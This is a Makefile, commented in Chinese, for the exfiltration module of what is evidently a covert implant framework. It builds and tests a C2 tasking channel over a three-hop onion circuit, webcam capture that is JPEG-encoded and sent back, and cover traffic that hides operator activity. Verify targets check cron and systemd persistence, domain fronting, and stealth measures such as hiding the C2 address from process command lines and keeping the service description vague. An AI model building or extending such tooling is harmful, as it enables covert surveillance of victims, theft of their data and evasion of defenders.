# 21_exfil/Makefile
#
# 采集产物回传层。
#
# 依赖（不自研第二套密码学，全部复用）：
#   14_p2p/build/libp2p.a  —— 定长信元层（底层 00_crypto 的 AES-128-GCM）
#   02_c2 / 00_crypto      —— GCM、SHA-256、HKDF、X25519
#   08_lateral             —— libp2p.a 内 relay 依赖的 poll 双工中继
#
# 依赖缺失时自动触发上游构建，不需要手工先 make 别的目录。

CC      ?= cc
CFLAGS  ?= -std=c11 -O2 -Wall -Wextra -Wpedantic -Wshadow -D_DEFAULT_SOURCE
CFLAGS  += -Iinclude -I../14_p2p/include -I../02_c2/include \
           -I../00_crypto/include -I../08_lateral/include \
           -I../agent_windows/include

BUILD   := build

P2PLIB  := ../14_p2p/build/libp2p.a
C2OBJS  := ../14_p2p/build/c2.o ../14_p2p/build/c2_frame.o \
           ../14_p2p/build/crypto_gcm.o ../14_p2p/build/crypto_hash.o \
           ../14_p2p/build/crypto_x25519.o
LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
# agent_windows 跨平台内核：采集 + JPEG 转码（端到端闭环的采集侧）
# 必须包含 cam_factory.o：cam_source_create / cam_source_destroy 已上移到
# cam_factory.c，各后端只导出自己的 create_*/destroy_*。少了它，
# cam_source_create 就是 undefined reference。
# cam_mock.o 也不可省：test_cam_e2e 用 backend="mock" 跑确定性帧。此前
# mock 与 v4l2 互斥（都导出 cam_source_create），现在经工厂分发可以共存。
AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
           ../agent_windows/build/linux/cam_mock.o \
           ../agent_windows/build/linux/cam_factory.o \
           ../agent_windows/build/linux/cam_linux_v4l2.o

all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_exfil_burst_cover \
           $(BUILD)/test_tol

$(BUILD):
	mkdir -p $(BUILD)

# 上游依赖 -> 触发构建。
# 必须挂 FORCE：这些目标是具体文件，没有前置依赖，make 见到文件存在就判定为最新、
# 直接跳过 recipe —— 于是"上游源码已改但产物仍在"时下游静默链接陈旧代码，无任何报错。
# 挂上 FORCE 后每次都执行 recipe，由上游 make 自身做增量判断（已最新时开销极小）。
# 不会递归：14_p2p 只请求 08_lateral 的叶子目标，agent_windows 的叶子目标只依赖
# 20_packer（20_packer 无任何上游），链条都在叶子处终止。
$(P2PLIB) $(C2OBJS): FORCE
	@$(MAKE) -C ../14_p2p --no-print-directory \
	  build/libp2p.a build/c2.o build/c2_frame.o \
	  build/crypto_gcm.o build/crypto_hash.o build/crypto_x25519.o

$(LATLIB): FORCE
	@$(MAKE) -C ../08_lateral --no-print-directory build/proxy.o build/lateral.o

# 四个都要显式列出。GNU make 会把由模式规则链式推导出的 .o 当作中间文件，
# 在本次 make 结束时自动 rm 掉——表现为 make 收尾打印一行
# "rm build/linux/cam_factory.o ..."。显式作为目标给出的文件不会被删，
# 所以这里必须逐个点名，否则下一轮 AGOBJS 引用时文件已经不存在。
$(AGOBJS): FORCE
	@$(MAKE) -C ../agent_windows --no-print-directory \
	  build/linux/cam_jpeg.o build/linux/cam_mock.o \
	  build/linux/cam_factory.o build/linux/cam_linux_v4l2.o

FORCE:

.PHONY: FORCE

$(BUILD)/exfil.o: src/exfil.c include/exfil.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# 回传层与已建立电路的 IO 绑定（记录 <-> fd），含短写/读满/截断判定
$(BUILD)/exfil_link.o: src/exfil_link.c include/exfil_link.h include/exfil.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# 采集调度层：触发模式 / 速率治理 / 去重。纯决策，不采集不发包，
# 故不链接任何密码学与上游库 —— 可独立编译。
$(BUILD)/sched.o: src/sched.c include/exfil_sched.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# C2 下行任务通道：编码唯一性校验 + 配置校验 + 落到调度器。
# 依赖 sched.o（作用对象）与 02_c2 帧层（AEAD 封装）。
$(BUILD)/task.o: src/task.c include/exfil_task.h include/exfil_sched.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

$(BUILD)/test_task: tests/test_task.c $(BUILD)/task.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/sched.o -o $@ \
	  $(LATLIB) $(C2OBJS) $(P2PLIB)

# 任务通道与已建立电路的 IO 绑定：长度前缀帧 + 双向 IV 计数 + seq 单调性
# （c2_frame 把 IV 放线上、不跟踪计数器，重放防护只能由本层补）
$(BUILD)/task_link.o: src/task_link.c include/exfil_task_link.h include/exfil_task.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# 验签失败容忍层：边界（防黑洞）+ 遥测（有人在动链路）
$(BUILD)/tol.o: src/tol.c include/exfil_tol.h include/exfil_task_link.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# 端到端：C2 命令经**真实洋葱电路**（3 跳真进程）下行 -> 落到植入体调度器
# -> 回执原路返回。含篡改/错密钥/重放/超长声明取证。
# 重连恢复接进真实洋葱电路：断开 -> 重建电路 -> 用恢复点续用会话。
# 含"计数归零 => IV 重用 => 必须 AUTH"的反证用例。
$(BUILD)/test_task_resume: tests/test_task_resume.c $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/task_link.o \
	  $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ \
	  $(LATLIB) $(C2OBJS) $(P2PLIB)

$(BUILD)/test_task_circuit: tests/test_task_circuit.c $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/task_link.o \
	  $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ \
	  $(LATLIB) $(C2OBJS) $(P2PLIB)

$(BUILD)/test_tol: tests/test_tol.c $(BUILD)/tol.o $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/tol.o $(BUILD)/task.o $(BUILD)/task_link.o \
	  $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ \
	  $(LATLIB) $(C2OBJS) $(P2PLIB)

$(BUILD)/test_sched: tests/test_sched.c $(BUILD)/sched.o
	$(CC) $(CFLAGS) $< $(BUILD)/sched.o -o $@

# 调度层与真实回传链路的集成对照：无限速 vs 调度门控，实测线上信元/字节
$(BUILD)/test_sched_gate: tests/test_sched_gate.c $(BUILD)/sched.o $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/sched.o $(BUILD)/exfil.o -o $@ \
	  $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB)

# 端到端：采集产物经**真实洋葱电路**（3 跳真进程）回传并对端重组
$(BUILD)/test_exfil_circuit: tests/test_exfil_circuit.c $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o $(BUILD)/exfil_link.o -o $@ \
	  $(LATLIB) $(C2OBJS) $(P2PLIB)

$(BUILD)/test_exfil: tests/test_exfil.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)

# 跨语言对齐工具：C 侧走真实会话派生编码出信元流 -> 文件，
# 供 13_c2_server（Python ExfilSink）解码比对。必须由 C 侧真编码才测得准。
$(BUILD)/dump_cells: tests/dump_cells.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)

# 端到端：agent_windows 采集 -> JPEG -> exfil 信元 -> 重组校验
$(BUILD)/test_cam_e2e: tests/test_cam_e2e.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB) FORCE
	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB)

# 自适应覆盖流量接入真实发送循环：提交 + 泵送（入队-出片交替）。
# 依赖 14_p2p 的 mix/cover（libp2p.a）与 exfil 的 chan/link。
$(BUILD)/link_cover.o: src/link_cover.c include/exfil_link_cover.h include/exfil.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# 真实进程端到端：fork + socketpair，父发子收。验证空闲期覆盖流量在线上
# 流动、覆盖不吃掉数据、大载荷分批入队发完、换信道覆盖自动缩放。
$(BUILD)/test_link_cover: tests/test_link_cover.c $(BUILD)/link_cover.o $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil.o $(BUILD)/exfil_link.o -o $@ \
	  $(LATLIB) $(C2OBJS) $(P2PLIB)

# 跨语言对齐工具：C 侧真编码任务/回执 -> 文件，供 Python 侧解码比对；
# 反向模式 chk 则读取 Python 生成的 wire 并解码，实现双向验证。
$(BUILD)/dump_task: tests/dump_task.c $(BUILD)/task.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/sched.o -o $@ \
	  $(LATLIB) $(C2OBJS) $(P2PLIB)

# 任务通道的覆盖流量维持：空闲期按预算持续吐出恒长 PAD 信元，消除
# 「链路静默=操作员空闲」「突发一个包=刚下了命令」的观测对应。
# PAD 走信元层、不动应用层 seq；与数据共用 cell 上下文以保证 counter 单调。
$(BUILD)/task_cover.o: src/task_cover.c include/exfil_task_cover.h \
                       include/exfil_task_link.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

$(BUILD)/test_task_cover: tests/test_task_cover.c $(BUILD)/task_cover.o \
    $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
    $(BUILD)/exfil.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/task_cover.o $(BUILD)/task.o \
	  $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o \
	  $(BUILD)/sched.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)

# 任务通道的**真实事件循环**：把覆盖从"可调用的函数"变成"长期运行的行为"。
# 两端各跑一个实例（下行由服务端补、上行由植入体补），只在一端跑覆盖会让
# 另一方向仍然可读——观察者能看出谁是控制端。
# 同时补回自适应：take_due 不推进 EWMA 窗口，故本层显式调用 p2p_cover_tick，
# 并暴露 note_data 让循环外发送的数据被计入。
$(BUILD)/cover_loop.o: src/cover_loop.c include/cover_loop.h \
                       include/exfil_task_cover.h include/exfil_task_link.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

$(BUILD)/test_cover_loop: tests/test_cover_loop.c $(BUILD)/cover_loop.o \
    $(BUILD)/task_cover.o $(BUILD)/task.o $(BUILD)/task_link.o \
    $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o \
    $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/cover_loop.o $(BUILD)/task_cover.o \
	  $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
	  $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)

# 覆盖循环接进**真实洋葱电路**的长跑：3 跳真进程 + tee 旁路抓包。
# 验证恒定形态在真实转发路径上仍成立，且做 budget=0 静默对照——
# 观察者只看信元数与间隔就能区分"有覆盖"和"无覆盖"，差异方向必须正确。
$(BUILD)/test_cover_circuit: tests/test_cover_circuit.c $(BUILD)/cover_loop.o \
    $(BUILD)/task_cover.o $(BUILD)/task.o $(BUILD)/task_link.o \
    $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o \
    $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/cover_loop.o $(BUILD)/task_cover.o \
	  $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
	  $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)

# 产物回传通道（上行）的覆盖取证：真实 3 跳洋葱电路 + tee 旁路抓包。
# 与 test_cover_circuit（任务通道/下行）互补——产物回传是周期性突发，
# 核心指标是「批间静默 max_gap」而非「尾部静默」。
$(BUILD)/test_exfil_cover_circuit: tests/test_exfil_cover_circuit.c \
    $(BUILD)/link_cover.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o \
    $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil_link.o \
	  $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)

# 大产物突发（100KB -> 204 信元/批）下的批间静默取证。
# 小产物场景已证 19 倍差异；大产物是真实采集负载，此前从未测过。
$(BUILD)/test_exfil_burst_cover: tests/test_exfil_burst_cover.c \
    $(BUILD)/link_cover.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o \
    $(LATLIB) $(C2OBJS) $(P2PLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil_link.o \
	  $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)

# deploy.sh 的 http 上传分支守卫：
#   200  -> 必须送达且字节数一致，然后清空
#   500  -> 必须 DIE 且保留落点
#   000  -> 连接失败同样保留落点
# 反向验证过：把清空移到上传之前，5 条断言变红（且 deploy.sh 自报"已上传
# 1282048 字节 HTTP 200"、退出 0，而服务端收到 0 字节 —— 三方都不报错）。
verify-upload:
	@python3 tests/verify_upload.py

# C2 收端：正向链路（起收端 -> camd 边采边发 -> 断言收到）与反向验证
# （注入故障，断言命令必须变红）。两者必须都跑——只跑正向证明不了守卫有效。
verify-c2:
	@python3 tests/verify_c2_chain.py

verify-c2-reverse:
	@python3 tests/verify_c2_reverse.py

# camd tls:// 出口：正向（真实 TLS 收端 + 自研 TLS 1.2 客户端握手 + 信元
# 送达 + 线上无明文）与反向 R1-R4（未给 CA / 错误 CA / IP 无 SNI / 发送
# 回调退回错误契约）。R4 是唯一能证明 tls.h 契约修复被守护的注入——不
# 注入的话，该缺陷会以"握手 transport error"的面目复发且无断言变红。
# 另：收端起不来必须 FATAL 点名，否则根因被伪装成握手错误（实测发生过：
# 证书文件瞬时读不到，症状却是握手失败，排查方向被彻底带偏）。
verify-tls-sink:
	@python3 tests/verify_tls_sink.py

verify-onekey-sink:
	@python3 tests/verify_onekey_sink.py

# cron 驻留"真的会执行"：此前本环境无任何 cron 守护进程（cron/crond/busybox
# 全无且装不上），条目写了却从未被执行过一次。本目标用 tests/crond_harness.py
# 按真实 cron.d 语义解析并真实 sh -c 执行，等到条目自己的时刻触发，
# 断言 C2 新增字节；R1 反向注入"点了 conf 但不导出"的缺陷写法，
# 证明正向断言不是恒绿。
verify-cron-exec:
	@python3 tests/verify_cron_exec.py

# 一键包的架构分发：只校验 ELF 魔数会放行错架构产物（实测"安装全绿、
# 退出码 0、camd 报 Exec format error"）。本目标按 uname -m 选节并校验
# e_machine，且用反向注入证明"必须拒绝"那几条不是恒绿。
verify-onekey-arch:
	@python3 tests/verify_onekey_arch.py

# 一键脚本的域前置（front://）接线：能力在 camd 里做出来，不等于部署脚本
# 接上了。本目标断言 front 模式产出 front:// sink、真实目标与 CA 进入
# CAMD_EXTRA、且 CAMD_EXTRA 带引号（实测缺陷：无引号时 conf 被 source 成
# "临时环境变量 + 执行命令"，参数静默丢失）；另配两条反向注入与三条静态
# 断言，防"另写一份硬编码 sink"重新发散。
verify-onekey-front:
	@python3 tests/verify_onekey_front.py

verify-prefix:
	@python3 tests/verify_prefix_isolation.py

# systemd 单元静态契约。systemd 主路径在本沙盒无法运行时验证（PID 1 非
# systemd，/run/systemd/private 无监听者），因此"单元内容应当满足什么"
# 必须以静态契约的形式永久校验——否则它是整条链上唯一一块从没被检查过
# 的地方，而它恰恰是生产环境的主路径。断言：Restart=always（崩溃自拉起）、
# EnvironmentFile 指向 conf（密钥注入通路）、ExecStart 走 run.sh 包装器
# （ExecStart 内的 $C2_ADDR 不会被 EnvironmentFile 替换，真 systemd 实测
# 踩出来的缺陷）、不含密钥与 C2 地址、Description 不点明功能，以及 run.sh
# 的 conf/bin 路径与 CONF_FILE/BIN_DST 同源。三条反向注入分别证明这三类
# 断言不是恒绿。
verify-name-stealth:
	@python3 tests/verify_name_stealth.py

# 驻留进程命令行不得含 C2 地址 / front-host / 密钥：/proc/<pid>/cmdline 是
# 0444 世界可读。真起进程读运行期 cmdline，并反向退回旧写法证明断言有鉴别力。
verify-cmdline-stealth:
	@python3 tests/verify_cmdline_stealth.py

verify-daemon-resilience:
	@python3 tests/verify_daemon_resilience.py

verify-unit-contract:
	@python3 tests/verify_unit_contract.py forward

verify-unit-contract-reverse:
	@python3 tests/verify_unit_contract.py desc
	@python3 tests/verify_unit_contract.py restart
	@python3 tests/verify_unit_contract.py paths

test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
	./$(BUILD)/test_exfil
	./$(BUILD)/test_cam_e2e
	./$(BUILD)/test_exfil_circuit
	./$(BUILD)/test_sched
	./$(BUILD)/test_sched_gate
	./$(BUILD)/test_task
	./$(BUILD)/test_task_circuit
	./$(BUILD)/test_link_cover
	./$(BUILD)/test_task_cover
	./$(BUILD)/test_cover_loop
	./$(BUILD)/test_cover_circuit
	./$(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
	./$(BUILD)/test_exfil_burst_cover

inspect: all
	@echo "== 21_exfil 公开符号 =="
	@nm -g --defined-only $(BUILD)/exfil.o | awk '$$2=="T"{print "  "$$3}'
	@echo "== 动态依赖 =="
	@ldd $(BUILD)/test_exfil | head -5

clean:
	rm -rf $(BUILD)

.PHONY: all test clean inspect verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience

